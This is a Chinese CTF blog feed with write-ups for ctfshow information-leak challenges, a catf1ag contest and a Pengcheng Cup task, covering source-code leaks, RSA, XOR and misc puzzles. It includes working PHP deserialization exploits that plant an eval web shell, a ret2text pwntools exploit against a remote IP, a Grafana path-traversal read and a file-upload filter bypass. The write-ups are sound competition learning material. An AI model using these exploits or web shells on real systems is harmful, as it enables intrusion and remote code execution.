<h1 id="phps源码泄露">phps源码泄露</h1>
<blockquote>
<p>phps源码泄露有时候能帮上忙</p>
</blockquote>
<p>访问indexphps得到源码，找到flag</p>
<p><img src="https://z4a.net/images/2022/06/13/imageb56cf9cde8428a5b.png" alt="imageb56cf9cde8428a5b.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;53fa760a-9c8b-4726-9516-925fabac2812&#125;</code></pre>
<h1 id="源码压缩包泄露">源码压缩包泄露</h1>
<blockquote>
<p>解压源码到当前目录，测试正常，收工</p>
</blockquote>
<p>访问www.zip得到源码，找到flag</p>
<p><img src="https://z4a.net/images/2022/06/13/imageaaba871fdf49e04b.png" alt="imageaaba871fdf49e04b.png"></p>
<pre><code class="hljs plaintext">&lt;?php
//flag in fl000g.txt
echo &quot;web6:where is flag?&quot;
?&gt;</code></pre>
<p><img src="https://z4a.net/images/2022/06/13/image9900c3d5a7540c15.png" alt="image9900c3d5a7540c15.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;fd9ec20c-0006-439c-939d-b40bd121aa06&#125;</code></pre>
<h1 id="版本控制泄露源码">版本控制泄露源码</h1>
<blockquote>
<p>版本控制很重要，但不要部署到生产环境更重要。</p>
</blockquote>
<p>访问<code>.git</code>得到flag</p>
<blockquote>
<p>科普一下：</p>
<p>这里是 .git 源码泄露。<br>
是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。</p>
<p>在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>
访问 url/.git/ ，得到 flag 。<br>
类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。</p>
</blockquote>
<pre><code class="hljs plaintext">ctfshow&#123;61341b8c-d82e-4aeb-9a2a-f549c074ee16&#125;</code></pre>
<h1 id="版本控制泄露源码2">版本控制泄露源码2</h1>
<blockquote>
<p>版本控制很重要，但不要部署到生产环境更重要。</p>
</blockquote>
<p>这个就是<code>.svn</code>，访问就行，原理和上边一样，会出现源码泄露</p>
<pre><code class="hljs plaintext">ctfshow&#123;daf49187-dad9-4ed7-960b-fdf4046f32b6&#125;</code></pre>
<p><a href="https://blog.csdn.net/weixin_39934520/article/details/107240360">浅谈“SVN信息泄露”</a></p>
<h1 id="vim临时文件泄露">vim临时文件泄露</h1>
<blockquote>
<p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
</blockquote>
<blockquote>
<p>vim是linux自带且常用的文件编辑器，vim在编辑时会生成一个隐藏的临时文件，当vim非正常关闭时这个文件就会被保留下来</p>
</blockquote>
<p>使用vim时意外退出，会在目录下生成一个备份文件，格式为 <code>.文件名.swp</code>，访问<code>/index.php.swp</code>下载备份文件，用记事本打开即可</p>
<pre><code class="hljs plaintext">ctfshow&#123;447d1577-c31f-47e1-85ed-8ffd4c9916dd&#125;</code></pre>
<h1 id="cookie泄露">cookie泄露</h1>
<blockquote>
<p>cookie 只是一块饼干，不能存放任何隐私数据</p>
</blockquote>
<p>看cookie得到flag</p>
<pre><code class="hljs plaintext">ctfshow&#123;4f9c1bc6-6291-4e7f-86be-a029aae5f2bc&#125;</code></pre>
<h1 id="域名txt记录泄露">域名txt记录泄露</h1>
<blockquote>
<p>域名其实也可以隐藏信息，<a href="http://xn--ctfshow-i22ms57k.com">比如ctfshow.com</a> 就隐藏了一条信息</p>
<p>5月30日 修复，目标地址为<strong><a href="http://flag.ctfshow.com">flag.ctfshow.com</a></strong></p>
</blockquote>
<p><a href="https://www.yisu.com/ask/2073.html#:~:text=%E6%A3%80%E6%B5%8B%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90txt%E8%AE%B0%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95%201.%E9%A6%96%E5%85%88%EF%BC%8C%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A1%8C%E9%9D%A2%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%BB%84%E5%90%88%E9%94%AE%E2%80%9Cwin%2BR%E2%80%9D%E8%BF%90%E8%A1%8Ccmd%EF%BC%8C%E6%89%93%E5%BC%80%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%AA%97%E5%8F%A3%EF%BC%9B,2.%E8%BF%9B%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%AA%97%E5%8F%A3%E5%90%8E%EF%BC%8C%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E6%89%A7%E8%A1%8Cnslookup%20-q%3Dtxt%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BTXT%E8%AE%B0%E5%BD%95%EF%BC%9B">如何测试域名解析的txt值</a></p>
<pre><code class="hljs plaintext">nslookup -q=txt flag.ctfshow.com</code></pre>
<p><img src="https://z4a.net/images/2022/06/13/image4dabb551e6ffa27a.png" alt="image4dabb551e6ffa27a.png"></p>
<pre><code class="hljs plaintext">flag&#123;just_seesee&#125;</code></pre>
<h1 id="敏感信息公布">敏感信息公布</h1>
<blockquote>
<p>有时候网站上的公开信息，就是管理员常用密码</p>
</blockquote>
<p>访问admin，账号就是admin，密码就是最下面的服务热线</p>
<pre><code class="hljs plaintext">ctfshow&#123;f7c5236b-8724-4f57-908d-28fb456c4e41&#125;</code></pre>
<h1 id="内部技术文档泄露">内部技术文档泄露</h1>
<blockquote>
<p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/13/imagef8a98659f2a124f3.png" alt="imagef8a98659f2a124f3.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;09aa1654-c792-446c-bfc4-5cb667138eaf&#125;</code></pre>
<h1 id="编辑器配置不当">编辑器配置不当</h1>
<blockquote>
<p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
</blockquote>
<p>访问<code>/editor</code><img src="https://z4a.net/images/2022/06/13/image85cae450cca1aa98.png" alt="image85cae450cca1aa98.png"></p>
<p><img src="https://z4a.net/images/2022/06/13/imagee6488cb3d27cf738.png" alt="imagee6488cb3d27cf738.png"></p>
<p>访问<code>/nothinghere/fl000g.txt</code>得到flag</p>
<pre><code class="hljs plaintext">ctfshow&#123;787108ea-c44a-4eea-afae-65378afc2f35&#125;</code></pre>
<h1 id="密码逻辑脆弱">密码逻辑脆弱</h1>
<blockquote>
<p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
</blockquote>
<p>浏览之后看到重要信息是邮箱<code>1156631961@qq.com</code></p>
<p>访问/admin进入后台<img src="https://z4a.net/images/2022/06/13/imageb0ae05a0d5f1c875.png" alt="imageb0ae05a0d5f1c875.png"></p>
<p>测试账号无果，发现忘记密码</p>
<p><img src="https://z4a.net/images/2022/06/13/image5bf79dec2db9c5b0.png" alt="image5bf79dec2db9c5b0.png"></p>
<p>通过邮箱可以找到这个地址</p>
<p><img src="https://z4a.net/images/2022/06/13/image42adb744b09cdfdb.png" alt="image42adb744b09cdfdb.png"></p>
<p>成功密码重置</p>
<p><img src="https://z4a.net/images/2022/06/13/imageb66f1fc3424a25f9.png" alt="imageb66f1fc3424a25f9.png"></p>
<p>登录得到flag</p>
<pre><code class="hljs plaintext">ctfshow&#123;0de6f584-2c77-4f8a-a160-e83ff823b60c&#125;</code></pre>
<h1 id="探针泄露">探针泄露</h1>
<blockquote>
<p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
</blockquote>
<p>访问<code>/tz.php</code> 版本是雅黑PHP探针</p>
<p><img src="https://z4a.net/images/2022/06/13/image182a0592e60fd446.png" alt="image182a0592e60fd446.png"></p>
<p>找到phpinfo，搜素得到flag</p>
<p><img src="https://z4a.net/images/2022/06/13/image88fd57fb7ead3d6e.png" alt="image88fd57fb7ead3d6e.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;134fb407-ba90-44c8-9831-e8a7b69e44c0&#125;</code></pre>
<h1 id="cdn穿透">CDN穿透</h1>
<blockquote>
<p>透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</p>
</blockquote>
<p>这个有手就行</p>
<pre><code class="hljs plaintext">flag&#123;111.231.70.44&#125;</code></pre>
<h1 id="js敏感信息泄露">js敏感信息泄露</h1>
<blockquote>
<p>不要着急，休息，休息一会儿，玩101分给你flag</p>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/13/image576b0d675980cc2d.png" alt="image576b0d675980cc2d.png"></p>
<p>这个加密的一段字母Unicode-str解码解密后得到</p>
<pre><code class="hljs plaintext">你赢了，去幺幺零点皮爱吃皮看看   // 110.php</code></pre>
<pre><code class="hljs plaintext">ctfshow&#123;8ce62a1e-e55a-4994-88c8-7cbcb6078fa8&#125;</code></pre>
<h1 id="前端密钥泄露">前端密钥泄露</h1>
<blockquote>
<p>密钥什么的，就不要放在前端了</p>
</blockquote>
<p>看源码得到重要密钥</p>
<p><img src="https://z4a.net/images/2022/06/13/image127188cd1bfb8e8a.png" alt="image127188cd1bfb8e8a.png"></p>
<p>登录得flag</p>
<p><img src="https://z4a.net/images/2022/06/13/imagedd5baed758944f93.png" alt="imagedd5baed758944f93.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;0c81020d-3b87-4c33-8a6a-ae73d68fb3d5&#125;</code></pre>
<h1 id="数据库恶意下载">数据库恶意下载</h1>
<blockquote>
<p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
</blockquote>
<p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加/db/db.mdb下载文件，用记事本打开搜索flag</p>
<pre><code class="hljs plaintext">flag&#123;ctfshow_old_database&#125;</code></pre>
<p>至此完结</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>首届“天权信安&amp;catf1ag”网络安全联合公开赛</title>
    <url>/2022/12/14/%E9%A6%96%E5%B1%8A%E2%80%9C%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89catf1ag%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20221214214722535.png?x-oss-process=hzy" alt="image-20221214214722535"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>区区第七不足挂齿，再接再厉</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20221214213946123.png?x-oss-process=hzy" alt="image-20221214213946123"></p>
<h1 id="wp">WP</h1>
<h1 id="pop">POP</h1>
<p>反序列化POP链子构造</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707600.png?x-oss-process=hzy" alt="img"></p>
<p>这地方使用php伪协议绕过写入文件</p>
<p><strong>php://filter/write=convert.base64-decode/resource=1.php</strong></p>
<p>文件内容写一句木马</p>
<p>POC如下</p>
<pre><code class="hljs plaintext">&lt;?php
class catf1ag1&#123;
    public $hzy;
    public $arr;
    function __construct()&#123;
        $this-&gt;hzy = new catf1ag2();
        $this-&gt;arr = array(&#x27;pputut&#x27;=&gt;&#x27;pputut&#x27;);
    &#125;
&#125;

class catf1ag2&#123;
    public $file ;
    public $txt;
    function __construct()&#123;
        $this-&gt;file = &#x27;php://filter/write=convert.base64-decode/resource=1.php&#x27;;
        $this-&gt;txt = &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;;
        $this-&gt;txt = base64_encode($this-&gt;txt);
    &#125;
&#125;
$shell = new catf1ag1();
$shell1 = serialize($shell);
$result = base64_encode($shell1);
print($result);
//Tzo4OiJjYXRmMWFnMSI6Mjp7czozOiJoenkiO086ODoiY2F0ZjFhZzIiOjI6e3M6NDoiZmlsZSI7czo1NToicGhwOi8vZmlsdGVyL3dyaXRlPWNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0xLnBocCI7czozOiJ0eHQiO3M6MzY6IlBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd6RmRLVHMvUGc9PSI7fXM6MzoiYXJyIjthOjE6e3M6NjoicHB1dHV0IjtzOjY6InBwdXR1dCI7fX0=</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707599.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>flag{2c0235e106ff8b51ec35e3054eddf9bd}</p>
<h1 id="十位马">十位马</h1>
<p>拿到附件是一堆数据，考虑到可能是hex数据，搜索常见文件头ZIP，PNG等等，发现存在zip可疑数据头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707597.png?x-oss-process=hzy" alt="img"></p>
<p>ZIP正常文件头应该是50 4B 03 04,但是这里上似乎是04034B50，同时前两位数据还被篡改了，大胆的猜想就是整个数据被两两导致又整体倒置了，写个脚本转换一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707610.png?x-oss-process=hzy" alt="img"></p>
<p>整体恢复之后再恢每两组的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707600.png?x-oss-process=hzy" alt="img"></p>
<p>使用脚本如下</p>
<pre><code class="hljs plaintext">data = open(&#x27;zipdata&#x27;,&#x27;w&#x27;)

with open(&#x27;data&#x27;,&#x27;r&#x27;)as file:

  wrong = file.read()

 

right = wrong[::-1]

print(right)

data.write(right)

print(&quot;success!!&quot;)

data.close()

flag = open(&quot;zip&quot;,&quot;rb&quot;)

right_flag = open(&quot;flag&quot;,&quot;w&quot;)

 

i=0

s=&quot;&quot;

 

while 1:

  c =flag.read(1)

  i = i+1

  if not c:

​    break

  else:

​    s += hex(ord(c))[2::].zfill(2)[::-1]

right_flag.write(s)

print(s)

print(&quot;complete!!&quot;)


 
 

\#data.write(right)</code></pre>
<p>恢复成功之后用010打开，把前两位改成50 4B</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707609.png?x-oss-process=hzy" alt="img"></p>
<p>保存之后解压</p>
<p>一百<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707914.png?x-oss-process=hzy" alt="img"></p>
<p>一百张图片，是拼图 10*10的，用montage工具即可，得到一个二维码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707019.png?x-oss-process=hzy" alt="img"></p>
<p>加一下定位角</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707169.png?x-oss-process=hzy" alt="img"></p>
<p>扫码得到flag</p>
<p>flag{cbef4c93-5e9c-11ed-8205-666c80085daf}</p>
<h1 id="ezlogin">ezlogin</h1>
<p>dirsearch扫一下扫到robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707275.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">访问得到/imdex.php/</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707284.png?x-oss-process=hzy" alt="img"></p>
<p>访问此路径得到提示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707368.png?x-oss-process=hzy" alt="img"></p>
<p>提示是try the way,source.php，看到urlway的值，是经过两次base64编码+hex转换，所以尝试一下这个方式加密source.php传参进去TnpNMlpqYzFOekkyTXpZMU1tVTNNRFk0TnpBPQ==</p>
<p>这个时候发现有个302跳转，抓包拦截</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707481.png?x-oss-process=hzy" alt="img"></p>
<p>又得到个路径/surprise/source.php，访问一下得到反序列化题目</p>
<p>死亡绕过+tostring魔法函数绕过，php伪协议绕过</p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">&lt;?php
class A&#123;
    public $hello;
    public function __construct()&#123;
        $this-&gt;hello = new B;
    &#125;
&#125;
class B&#123;
    public $file;
    public $text;
    public function __construct($file=&#x27;&#x27;,$text=&#x27;&#x27;) &#123;
        $this -&gt; file = &#x27;php://filter/write=string.rot13/resource=1.php&#x27;;
        $this -&gt; text = &#x27;&lt;?cuc riny($_CBFG[1]);&#x27;;

    &#125;
&#125;

$h = new A();
$SHELL = serialize($h);
echo urlencode($SHELL);
// O%3A1%3A%22A%22%3A1%3A%7Bs%3A5%3A%22hello%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A46%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D1.php%22%3Bs%3A4%3A%22text%22%3Bs%3A22%3A%22%3C%3Fcuc+riny%28%24_CBFG%5B1%5D%29%3B%22%3B%7D%7D</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707519.png?x-oss-process=hzy" alt="img"></p>
<p>flag{bed8858318758dc173a061631707a157}</p>
<h1 id="history">history</h1>
<p>Grafana8.3.0版本，目录穿越历史漏洞，任意文件读取直接搜</p>
<p><a href="https://blog.csdn.net/MrHatSec/article/details/123523216">(70条消息) Grafana 任意文件读取漏洞复现_MrHatSec的博客-CSDN博客_grafana漏洞</a></p>
<p>爆破发现插件是gettingstarted，题目提示没有做好痕迹清理，读文件/home/grafana/.bash_history</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707539.png?x-oss-process=hzy" alt="img"></p>
<p>发现写入flag的命令，找到flag路径直接读得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707605.png?x-oss-process=hzy" alt="img"></p>
<p>flag{a5899c555d6b61207b4dcab081e837b5}</p>
<h1 id="fileupload">fileupload</h1>
<p>题目看源码得到提示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707920.png?x-oss-process=hzy" alt="img">、</p>
<p>访问include/f1ag_1s_n0t_here.php找到上传点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707266.png?x-oss-process=hzy" alt="img"></p>
<p>只允许上传jpg，bp抓包拦截一下，发现php也被过滤了，大小写绕过，直接命令执行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707391.png?x-oss-process=hzy" alt="img"></p>
<p>访问该文件uploads/20221209150134_513.pHP5</p>
<p>得到flag</p>
<p>flag{8bc42d9c0d609ddefccf8c576e86ce5f}</p>
<h1 id="passwd">passwd</h1>
<p>根据题目描述可以知道sha256爆破，根据条件去写脚本爆破（ps：这里不得不吐槽一下，密文格式说了是带文字的，这地方很容易误导人，我就是带了文字一直爆破都不行，后来发现不带文字秒出了），题目就是这么个题目，脚本如下</p>
<pre><code class="hljs plaintext">import hashlib
from turtle import right
for h in range(0,3):#时
    for y in range(0,10):#时
        for g in range(0,4):#日
            for n in range(0,10):
                for e in range(0,2):#月
                    for w in range(1,3):#月
                        #for d in range(0,3):#nian
                           # for r in range(0,10):#nian
                                for c in range(0,10):#分
                                    for m in range(0,7):
                                        #for t in range(1,3):
                                            #for o in range(0,3):
                                                #num=&quot;2022年&quot;+str(e)+str(w)+&quot;月&quot;+str(g)+str(n)+&quot;日&quot;+str(h)+str(y)+&quot;时&quot;+str(m)+str(c)+&quot;分&quot;
                                                num=&quot;2022&quot;+str(e)+str(w)+str(g)+str(n)+str(h)+str(y)+str(m)+str(c)
                                                num_sha = hashlib.sha256(num.encode(&#x27;utf-8&#x27;)).hexdigest()
                                                print(num)
                                                print(num_sha)
                                                #right = &quot;3250a3e26bd6516c36468efa150584cc8799257fbd6edd8bcecd8016ab72f74c&quot;

                                                right = &quot;69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95&quot;
                                                if(num_sha == right):
                                                    print(num)
                                                    print(&quot;success!!!&quot;)
                                                    exit()</code></pre>
<p>爆破得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707580.png?x-oss-process=hzy" alt="img"></p>
<p>catf1ag{202211121750}</p>
<h1 id="疑惑">疑惑</h1>
<p>疑惑，异或</p>
<p>打开附件，数据异或一下</p>
<pre><code class="hljs plaintext">a=&#x27;welcome_to_nine-ak_match_is_so_easy_!@!&#x27;
 b=[20, 4, 24, 5, 94, 12, 2, 36 ,26, 6, 49, 11, 68, 15, 14, 114, 12, 10, 43, 14, 9 ,43 ,10, 27, 31, 31, 22, 45, 10, 48, 58, 4 ,18, 10, 38, 31, 14, 97, 92]
 flag=&#x27;&#x27;
 for i in range(len(a)):
   flag+=chr(ord(a[i])^b[i])
 print(flag)</code></pre>
<p>catf1ag{nine-ak_match_is@very_easy_@/!}</p>
<h1 id="checkin">checkin</h1>
<p>atoi函数绕过，第一位不能是负号‘-‘</p>
<p>那就空格-1绕过</p>
<p>Ret2text</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">from pwn import *

context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)

p=remote(&quot;180.76.166.28&quot;,6000)

\#p=process(&quot;./checkin&quot;)

hack=0x0000000000400866+1

payload0=b&#x27;adad&#x27;

payload=b&#x27; -1&#x27;

payload1=b&#x27;a&#x27;*(0x50+8)+p64(hack)

p.sendline(payload0)

sleep(1)

p.sendline(payload)

sleep(1) flag&#123;2e94dd86-a57b-4365-b559-9e8a2ca0a8d4&#125;

p.sendline(payload1)

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707584.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{2e94dd86-a57b-4365-b559-9e8a2ca0a8d4}</p>
<h1 id="angr">angr</h1>
<p>第一次输入0让dword_804A06C=1</p>
<p>第二个输入2，让其执行system函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707585.png?x-oss-process=hzy" alt="img"></p>
<h1 id="简单隐写">简单隐写</h1>
<p>拿到附件发现是jpg</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707596.png?x-oss-process=hzy" alt="img"></p>
<p>藏了压缩包，尝试解压发现需要密码</p>
<p>Jphswin隐写得到解压密码catf1agcatf1agcatf1ag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707857.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707074.png?x-oss-process=hzy" alt="img"></p>
<p>再使用凯撒爆破一下得到明文flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707136.png?x-oss-process=hzy" alt="img"></p>
<p>catf1ag{JPhs_w1n_Y0u_G3t_IT!!!}</p>
<h1 id="easyrsa">easyrsa</h1>
<p>已知e,n,d,c</p>
<p>首先先yafu分解得到p，q</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707152.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">P=

117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800085999

P309 

q=

117123319508571660311580580801277877113258215841429600587756950705045059473605968354897102454036753352698271630058203802982435282995624979494332828978380786264504042406030779426255482928</code></pre>
<p>292116935288547705920337997660644513247195680353414889901462368164202774814849550617113594461044664436362334469679800084891</p>
<p>然后脚本一把梭，得到flag</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import long_to_bytes

n=13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109

e=0x10001

c=11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578

d=12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093

key=pow(c,d,n)

print(long_to_bytes(key))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011707193.png?x-oss-process=hzy" alt="img"></p>
<p>flag{3895dfda-67b1-11ed-b784-b07b2568d266}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏城杯</title>
    <url>/2022/07/03/%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207031012321.png?x-oss-process=hzy" alt="image-20220703101236246"><span id="more"></span></p>
<h1 id="what_is_log">what_is_log</h1>
<p>查看附件日志，通过上下关联，分析看到数据库登陆的信息</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217743.gif?x-oss-process=hzy" alt="img"></p>
<p>即推断flag为PCL{1555a651a13ec074ce725383214fd7cc}</p>
<h1 id="简单包含">简单包含</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030917682.png?x-oss-process=hzy" alt="image-20220703091710580"></p>
<p>简单的文件包含，测试发现存在waf</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030917769.png?x-oss-process=hzy" alt="image-20220703091740716"></p>
<p>使用脏数据绕过，成功执行包含文件</p>
<pre><code class="hljs plaintext">wsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsy